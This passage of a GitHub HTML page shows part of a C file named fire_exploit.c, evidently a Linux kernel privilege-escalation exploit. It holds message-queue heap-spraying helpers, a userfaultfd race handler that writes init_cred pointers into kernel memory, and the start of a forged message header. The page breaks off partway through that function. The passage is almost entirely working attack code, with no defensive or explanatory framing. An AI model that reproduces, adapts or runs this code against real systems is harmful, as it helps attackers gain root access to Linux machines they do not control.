          <td id="file-fire_exploit-c-LC181" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> result;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L182" class="blob-num js-line-number js-code-nav-line-number" data-line-number="182"></td>
          <td id="file-fire_exploit-c-LC182" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L183" class="blob-num js-line-number js-code-nav-line-number" data-line-number="183"></td>
          <td id="file-fire_exploit-c-LC183" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L184" class="blob-num js-line-number js-code-nav-line-number" data-line-number="184"></td>
          <td id="file-fire_exploit-c-LC184" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">get_msg</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">void</span> *msgp, <span class="pl-c1">size_t</span> msgsz, <span class="pl-k">long</span> msgtyp, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L185" class="blob-num js-line-number js-code-nav-line-number" data-line-number="185"></td>
          <td id="file-fire_exploit-c-LC185" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L186" class="blob-num js-line-number js-code-nav-line-number" data-line-number="186"></td>
          <td id="file-fire_exploit-c-LC186" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">msgrcv</span>(msqid, msgp, msgsz, msgtyp, msgflg) &lt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L187" class="blob-num js-line-number js-code-nav-line-number" data-line-number="187"></td>
          <td id="file-fire_exploit-c-LC187" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L188" class="blob-num js-line-number js-code-nav-line-number" data-line-number="188"></td>
          <td id="file-fire_exploit-c-LC188" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgrcv<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L189" class="blob-num js-line-number js-code-nav-line-number" data-line-number="189"></td>
          <td id="file-fire_exploit-c-LC189" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L190" class="blob-num js-line-number js-code-nav-line-number" data-line-number="190"></td>
          <td id="file-fire_exploit-c-LC190" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L191" class="blob-num js-line-number js-code-nav-line-number" data-line-number="191"></td>
          <td id="file-fire_exploit-c-LC191" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L192" class="blob-num js-line-number js-code-nav-line-number" data-line-number="192"></td>
          <td id="file-fire_exploit-c-LC192" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L193" class="blob-num js-line-number js-code-nav-line-number" data-line-number="193"></td>
          <td id="file-fire_exploit-c-LC193" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L194" class="blob-num js-line-number js-code-nav-line-number" data-line-number="194"></td>
          <td id="file-fire_exploit-c-LC194" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">send_msg</span>(<span class="pl-k">int</span> msqid, <span class="pl-k">void</span> *msgp, <span class="pl-c1">size_t</span> msgsz, <span class="pl-k">int</span> msgflg)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L195" class="blob-num js-line-number js-code-nav-line-number" data-line-number="195"></td>
          <td id="file-fire_exploit-c-LC195" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L196" class="blob-num js-line-number js-code-nav-line-number" data-line-number="196"></td>
          <td id="file-fire_exploit-c-LC196" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">msgsnd</span>(msqid, msgp, msgsz, msgflg) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L197" class="blob-num js-line-number js-code-nav-line-number" data-line-number="197"></td>
          <td id="file-fire_exploit-c-LC197" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L198" class="blob-num js-line-number js-code-nav-line-number" data-line-number="198"></td>
          <td id="file-fire_exploit-c-LC198" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgsend failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L199" class="blob-num js-line-number js-code-nav-line-number" data-line-number="199"></td>
          <td id="file-fire_exploit-c-LC199" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L200" class="blob-num js-line-number js-code-nav-line-number" data-line-number="200"></td>
          <td id="file-fire_exploit-c-LC200" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L201" class="blob-num js-line-number js-code-nav-line-number" data-line-number="201"></td>
          <td id="file-fire_exploit-c-LC201" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L202" class="blob-num js-line-number js-code-nav-line-number" data-line-number="202"></td>
          <td id="file-fire_exploit-c-LC202" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L203" class="blob-num js-line-number js-code-nav-line-number" data-line-number="203"></td>
          <td id="file-fire_exploit-c-LC203" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L204" class="blob-num js-line-number js-code-nav-line-number" data-line-number="204"></td>
          <td id="file-fire_exploit-c-LC204" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">generic_msg_spray</span>(<span class="pl-k">unsigned</span> <span class="pl-k">int</span> size, <span class="pl-k">unsigned</span> <span class="pl-k">int</span> amount)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L205" class="blob-num js-line-number js-code-nav-line-number" data-line-number="205"></td>
          <td id="file-fire_exploit-c-LC205" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L206" class="blob-num js-line-number js-code-nav-line-number" data-line-number="206"></td>
          <td id="file-fire_exploit-c-LC206" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> qid;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L207" class="blob-num js-line-number js-code-nav-line-number" data-line-number="207"></td>
          <td id="file-fire_exploit-c-LC207" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> buffer[<span class="pl-c1">0x1000</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L208" class="blob-num js-line-number js-code-nav-line-number" data-line-number="208"></td>
          <td id="file-fire_exploit-c-LC208" class="blob-code blob-code-inner js-file-line">    msg *spray = (msg *)buffer;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L209" class="blob-num js-line-number js-code-nav-line-number" data-line-number="209"></td>
          <td id="file-fire_exploit-c-LC209" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L210" class="blob-num js-line-number js-code-nav-line-number" data-line-number="210"></td>
          <td id="file-fire_exploit-c-LC210" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">assert</span>(size &gt;= <span class="pl-c1">0x31</span> &amp;&amp; size &lt;= <span class="pl-c1">0x1000</span> - <span class="pl-c1">0x8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L211" class="blob-num js-line-number js-code-nav-line-number" data-line-number="211"></td>
          <td id="file-fire_exploit-c-LC211" class="blob-code blob-code-inner js-file-line">    spray-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L212" class="blob-num js-line-number js-code-nav-line-number" data-line-number="212"></td>
          <td id="file-fire_exploit-c-LC212" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(spray-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0</span>, size);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L213" class="blob-num js-line-number js-code-nav-line-number" data-line-number="213"></td>
          <td id="file-fire_exploit-c-LC213" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L214" class="blob-num js-line-number js-code-nav-line-number" data-line-number="214"></td>
          <td id="file-fire_exploit-c-LC214" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((qid = <span class="pl-c1">msgget</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L215" class="blob-num js-line-number js-code-nav-line-number" data-line-number="215"></td>
          <td id="file-fire_exploit-c-LC215" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L216" class="blob-num js-line-number js-code-nav-line-number" data-line-number="216"></td>
          <td id="file-fire_exploit-c-LC216" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgget failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L217" class="blob-num js-line-number js-code-nav-line-number" data-line-number="217"></td>
          <td id="file-fire_exploit-c-LC217" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L218" class="blob-num js-line-number js-code-nav-line-number" data-line-number="218"></td>
          <td id="file-fire_exploit-c-LC218" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L219" class="blob-num js-line-number js-code-nav-line-number" data-line-number="219"></td>
          <td id="file-fire_exploit-c-LC219" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; amount; i++)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L220" class="blob-num js-line-number js-code-nav-line-number" data-line-number="220"></td>
          <td id="file-fire_exploit-c-LC220" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L221" class="blob-num js-line-number js-code-nav-line-number" data-line-number="221"></td>
          <td id="file-fire_exploit-c-LC221" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">msgsnd</span>(qid, spray, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L222" class="blob-num js-line-number js-code-nav-line-number" data-line-number="222"></td>
          <td id="file-fire_exploit-c-LC222" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L223" class="blob-num js-line-number js-code-nav-line-number" data-line-number="223"></td>
          <td id="file-fire_exploit-c-LC223" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>msgsend failure<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L224" class="blob-num js-line-number js-code-nav-line-number" data-line-number="224"></td>
          <td id="file-fire_exploit-c-LC224" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L225" class="blob-num js-line-number js-code-nav-line-number" data-line-number="225"></td>
          <td id="file-fire_exploit-c-LC225" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L226" class="blob-num js-line-number js-code-nav-line-number" data-line-number="226"></td>
          <td id="file-fire_exploit-c-LC226" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L227" class="blob-num js-line-number js-code-nav-line-number" data-line-number="227"></td>
          <td id="file-fire_exploit-c-LC227" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L228" class="blob-num js-line-number js-code-nav-line-number" data-line-number="228"></td>
          <td id="file-fire_exploit-c-LC228" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L229" class="blob-num js-line-number js-code-nav-line-number" data-line-number="229"></td>
          <td id="file-fire_exploit-c-LC229" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L230" class="blob-num js-line-number js-code-nav-line-number" data-line-number="230"></td>
          <td id="file-fire_exploit-c-LC230" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">debug</span>()</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L231" class="blob-num js-line-number js-code-nav-line-number" data-line-number="231"></td>
          <td id="file-fire_exploit-c-LC231" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L232" class="blob-num js-line-number js-code-nav-line-number" data-line-number="232"></td>
          <td id="file-fire_exploit-c-LC232" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>pause<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L233" class="blob-num js-line-number js-code-nav-line-number" data-line-number="233"></td>
          <td id="file-fire_exploit-c-LC233" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">getchar</span>();</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L234" class="blob-num js-line-number js-code-nav-line-number" data-line-number="234"></td>
          <td id="file-fire_exploit-c-LC234" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L235" class="blob-num js-line-number js-code-nav-line-number" data-line-number="235"></td>
          <td id="file-fire_exploit-c-LC235" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L236" class="blob-num js-line-number js-code-nav-line-number" data-line-number="236"></td>
          <td id="file-fire_exploit-c-LC236" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L237" class="blob-num js-line-number js-code-nav-line-number" data-line-number="237"></td>
          <td id="file-fire_exploit-c-LC237" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">arb_write</span>(<span class="pl-k">void</span> *arg)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L238" class="blob-num js-line-number js-code-nav-line-number" data-line-number="238"></td>
          <td id="file-fire_exploit-c-LC238" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L239" class="blob-num js-line-number js-code-nav-line-number" data-line-number="239"></td>
          <td id="file-fire_exploit-c-LC239" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffd_msg uf_msg;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L240" class="blob-num js-line-number js-code-nav-line-number" data-line-number="240"></td>
          <td id="file-fire_exploit-c-LC240" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_copy uf_copy;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L241" class="blob-num js-line-number js-code-nav-line-number" data-line-number="241"></td>
          <td id="file-fire_exploit-c-LC241" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_range uf_range;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L242" class="blob-num js-line-number js-code-nav-line-number" data-line-number="242"></td>
          <td id="file-fire_exploit-c-LC242" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">long</span> uffd = (<span class="pl-k">long</span>)arg;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L243" class="blob-num js-line-number js-code-nav-line-number" data-line-number="243"></td>
          <td id="file-fire_exploit-c-LC243" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> pollfd pollfd;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L244" class="blob-num js-line-number js-code-nav-line-number" data-line-number="244"></td>
          <td id="file-fire_exploit-c-LC244" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> nready;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L245" class="blob-num js-line-number js-code-nav-line-number" data-line-number="245"></td>
          <td id="file-fire_exploit-c-LC245" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L246" class="blob-num js-line-number js-code-nav-line-number" data-line-number="246"></td>
          <td id="file-fire_exploit-c-LC246" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">fd</span> = uffd;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L247" class="blob-num js-line-number js-code-nav-line-number" data-line-number="247"></td>
          <td id="file-fire_exploit-c-LC247" class="blob-code blob-code-inner js-file-line">    pollfd.<span class="pl-smi">events</span> = POLLIN;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L248" class="blob-num js-line-number js-code-nav-line-number" data-line-number="248"></td>
          <td id="file-fire_exploit-c-LC248" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L249" class="blob-num js-line-number js-code-nav-line-number" data-line-number="249"></td>
          <td id="file-fire_exploit-c-LC249" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">start</span> = race_page;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L250" class="blob-num js-line-number js-code-nav-line-number" data-line-number="250"></td>
          <td id="file-fire_exploit-c-LC250" class="blob-code blob-code-inner js-file-line">    uf_range.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L251" class="blob-num js-line-number js-code-nav-line-number" data-line-number="251"></td>
          <td id="file-fire_exploit-c-LC251" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L252" class="blob-num js-line-number js-code-nav-line-number" data-line-number="252"></td>
          <td id="file-fire_exploit-c-LC252" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span>(<span class="pl-c1">poll</span>(&amp;pollfd, <span class="pl-c1">1</span>, -<span class="pl-c1">1</span>) &gt; <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L253" class="blob-num js-line-number js-code-nav-line-number" data-line-number="253"></td>
          <td id="file-fire_exploit-c-LC253" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L254" class="blob-num js-line-number js-code-nav-line-number" data-line-number="254"></td>
          <td id="file-fire_exploit-c-LC254" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(pollfd.<span class="pl-smi">revents</span> &amp; POLLERR || pollfd.<span class="pl-smi">revents</span> &amp; POLLHUP)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L255" class="blob-num js-line-number js-code-nav-line-number" data-line-number="255"></td>
          <td id="file-fire_exploit-c-LC255" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L256" class="blob-num js-line-number js-code-nav-line-number" data-line-number="256"></td>
          <td id="file-fire_exploit-c-LC256" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>polling error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L257" class="blob-num js-line-number js-code-nav-line-number" data-line-number="257"></td>
          <td id="file-fire_exploit-c-LC257" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L258" class="blob-num js-line-number js-code-nav-line-number" data-line-number="258"></td>
          <td id="file-fire_exploit-c-LC258" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L259" class="blob-num js-line-number js-code-nav-line-number" data-line-number="259"></td>
          <td id="file-fire_exploit-c-LC259" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> reading the event</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L260" class="blob-num js-line-number js-code-nav-line-number" data-line-number="260"></td>
          <td id="file-fire_exploit-c-LC260" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">read</span>(uffd, &amp;uf_msg, <span class="pl-k">sizeof</span>(uf_msg)) == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L261" class="blob-num js-line-number js-code-nav-line-number" data-line-number="261"></td>
          <td id="file-fire_exploit-c-LC261" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L262" class="blob-num js-line-number js-code-nav-line-number" data-line-number="262"></td>
          <td id="file-fire_exploit-c-LC262" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error reading event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L263" class="blob-num js-line-number js-code-nav-line-number" data-line-number="263"></td>
          <td id="file-fire_exploit-c-LC263" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L264" class="blob-num js-line-number js-code-nav-line-number" data-line-number="264"></td>
          <td id="file-fire_exploit-c-LC264" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L265" class="blob-num js-line-number js-code-nav-line-number" data-line-number="265"></td>
          <td id="file-fire_exploit-c-LC265" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(uf_msg.<span class="pl-smi">event</span> != UFFD_EVENT_PAGEFAULT)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L266" class="blob-num js-line-number js-code-nav-line-number" data-line-number="266"></td>
          <td id="file-fire_exploit-c-LC266" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L267" class="blob-num js-line-number js-code-nav-line-number" data-line-number="267"></td>
          <td id="file-fire_exploit-c-LC267" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>unexpected result from event<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L268" class="blob-num js-line-number js-code-nav-line-number" data-line-number="268"></td>
          <td id="file-fire_exploit-c-LC268" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L269" class="blob-num js-line-number js-code-nav-line-number" data-line-number="269"></td>
          <td id="file-fire_exploit-c-LC269" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L270" class="blob-num js-line-number js-code-nav-line-number" data-line-number="270"></td>
          <td id="file-fire_exploit-c-LC270" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L271" class="blob-num js-line-number js-code-nav-line-number" data-line-number="271"></td>
          <td id="file-fire_exploit-c-LC271" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span> change to init_cred</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L272" class="blob-num js-line-number js-code-nav-line-number" data-line-number="272"></td>
          <td id="file-fire_exploit-c-LC272" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> uf_buffer[<span class="pl-c1">0x1000</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L273" class="blob-num js-line-number js-code-nav-line-number" data-line-number="273"></td>
          <td id="file-fire_exploit-c-LC273" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(uf_buffer, <span class="pl-c1">0x43</span>, <span class="pl-k">sizeof</span>(uf_buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L274" class="blob-num js-line-number js-code-nav-line-number" data-line-number="274"></td>
          <td id="file-fire_exploit-c-LC274" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)(uf_buffer + <span class="pl-c1">0x1000</span>-<span class="pl-c1">0x30</span>), (<span class="pl-k">void</span> *)&amp;init_cred, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L275" class="blob-num js-line-number js-code-nav-line-number" data-line-number="275"></td>
          <td id="file-fire_exploit-c-LC275" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)(uf_buffer + <span class="pl-c1">0x1000</span>-<span class="pl-c1">0x30</span> + <span class="pl-c1">8</span>), (<span class="pl-k">void</span> *)&amp;init_cred, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L276" class="blob-num js-line-number js-code-nav-line-number" data-line-number="276"></td>
          <td id="file-fire_exploit-c-LC276" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L277" class="blob-num js-line-number js-code-nav-line-number" data-line-number="277"></td>
          <td id="file-fire_exploit-c-LC277" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">src</span> = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)uf_buffer;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L278" class="blob-num js-line-number js-code-nav-line-number" data-line-number="278"></td>
          <td id="file-fire_exploit-c-LC278" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">dst</span> = race_page;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L279" class="blob-num js-line-number js-code-nav-line-number" data-line-number="279"></td>
          <td id="file-fire_exploit-c-LC279" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L280" class="blob-num js-line-number js-code-nav-line-number" data-line-number="280"></td>
          <td id="file-fire_exploit-c-LC280" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">mode</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L281" class="blob-num js-line-number js-code-nav-line-number" data-line-number="281"></td>
          <td id="file-fire_exploit-c-LC281" class="blob-code blob-code-inner js-file-line">        uf_copy.<span class="pl-smi">copy</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L282" class="blob-num js-line-number js-code-nav-line-number" data-line-number="282"></td>
          <td id="file-fire_exploit-c-LC282" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L283" class="blob-num js-line-number js-code-nav-line-number" data-line-number="283"></td>
          <td id="file-fire_exploit-c-LC283" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> buffer[<span class="pl-c1">0x2000</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L284" class="blob-num js-line-number js-code-nav-line-number" data-line-number="284"></td>
          <td id="file-fire_exploit-c-LC284" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L285" class="blob-num js-line-number js-code-nav-line-number" data-line-number="285"></td>
          <td id="file-fire_exploit-c-LC285" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L286" class="blob-num js-line-number js-code-nav-line-number" data-line-number="286"></td>
          <td id="file-fire_exploit-c-LC286" class="blob-code blob-code-inner js-file-line">        msg_header evil;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L287" class="blob-num js-line-number js-code-nav-line-number" data-line-number="287"></td>
          <td id="file-fire_exploit-c-LC287" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(evil));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L288" class="blob-num js-line-number js-code-nav-line-number" data-line-number="288"></td>
          <td id="file-fire_exploit-c-LC288" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">ll_next</span> = (<span class="pl-k">void</span> *)<span class="pl-c1">0x1337babe</span>;</td>
        </tr>
        <tr>
